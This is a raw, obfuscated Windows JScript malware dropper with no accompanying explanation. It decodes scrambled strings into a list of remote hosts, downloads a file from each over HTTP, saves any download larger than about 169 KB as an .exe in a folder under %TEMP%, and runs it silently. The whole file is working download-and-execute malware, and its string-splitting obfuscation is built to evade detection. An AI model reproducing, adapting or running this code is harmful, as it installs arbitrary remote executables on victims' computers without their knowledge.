

function inRYegGzC(GJaRFJrtZko) {
var MrEYqHuW = WScript.CreateObject("Wscript.Shell");
MrEYqHuW.Run(GJaRFJrtZko, 0x1, 0x0);
}
function VgxFwAHCr(PtUAL,LlFXs,FlysN) {
var mkLge = "NdGVLQ Bpp pt.Shell bllEtPp Scri".split(" ");
var iGI=((1)?"W" + mkLge[4]:"")+mkLge[2];
var pt = WScript.CreateObject(iGI);
var Gk = "%TEMP%\\";
return pt.ExpandEnvironmentStrings(Gk);
}
function OdqYYdyX() {
var xAcDuWW = "ipting";
var grQibGokBt = "ile";
var xJpUs = "System";
return "Sc" + "r" + xAcDuWW + ".F" + grQibGokBt + xJpUs + "Obj" + "ect";
}
function eWoi(imumB) {
return WScript.CreateObject(imumB);
}
function BCqs(tiLfc,OztrY) {
tiLfc.write(OztrY);
}
function DKdw(ReLQG) {
ReLQG.open();
}
function kVOM(OtVRo,bQfrW) {
OtVRo.saveToFile(bQfrW,967-965);
}
function qdXC(NJfpu,eKPkH,suJDl) {
NJfpu.open(suJDl,eKPkH,false);
}
function eaom(RCxQE) {
if (RCxQE == 975-775){return true;} else {return false;}
}
function DGGa(ugtoW) {
if (ugtoW > 170089-579){return true;} else {return false;}
}
function zoYB(Ybfwv) {
var VOEVr="";
for(j=(433-433); j < Ybfwv.length; j++)
if (j % (179-177) != (304-304)) {
VOEVr += Ybfwv.substr(j, 957-956);
}
return VOEVr;
}
function aPJG(Kgoie) {
Kgoie.send();
}
function muxg(TIMdT) {
return TIMdT.status;
}
var yQ="0tyhNi6szivsGiWtQsqqQqx.Uc7owmo/T6N9L.reWxxej?l 4omhriEysodu1nBg1bzutydf8fi.IcDo9mh/x6J9t.MeLxaek?l M?x d?f I?";
var m = zoYB(yQ).split(" ");
var HnS = VgxFwAHCr("qQHr","QWyZf","lMxsrd");
var lnR = new ActiveXObject(OdqYYdyX());
var PAfC = HnS+"gCQQtMh\\";
try{
lnR.CreateFolder(PAfC);
}catch(Nxfyoh){
};
var Cdk = "2.XMLH";
var PVo = (Cdk + "TTP" + " qrdKixY yufRR XML ream St tpRdoTVk AD ZPRWRnX OD").split(" ");
var ua = true  , Laak = PVo[7] + "" + PVo[9];
var lo = eWoi("MS"+PVo[3]+(525261, PVo[0]));
var CJf = eWoi(Laak + "B." + PVo[5]+(689665, PVo[4]));
var VWV = 0;
var K = 1;
var TnYmoIC = 833555;
var O=VWV;
while (true)  {
if(O>=m.length) {break;}
var ap = 0;
var xzS = ("ht" + " DBUIFTI tp kDeqN RHNqiQAB :// laYRvLL .exe  GET").split(" ");
try  {
qdXC(lo,xzS[0]+xzS[2]+xzS[5]+m[O]+K, "GET"); aPJG(lo); if (eaom(muxg(lo)))  {      
DKdw(CJf); CJf.type = 1; BCqs(CJf,lo.responseBody); if (DGGa(CJf.size))  {
ap = 1; CJf.position = 0; kVOM(CJf,/*EAa982l7jX*/PAfC/*dub829fDxZ*/+TnYmoIC+xzS[7]); try  {
if (((new Date())>0,793708888)) {
inRYegGzC(PAfC+TnYmoIC+/*KEKW17I1vu*/xzS[7]/*nexd42SjGg*/); 
break;
}
}
catch (Ee)  {
}; 
}; CJf.close(); 
}; 
if (ap == 1)  {
VWV = O; break; 
}; 
}
catch (Ee)  { 
}; 
O++;
}; 

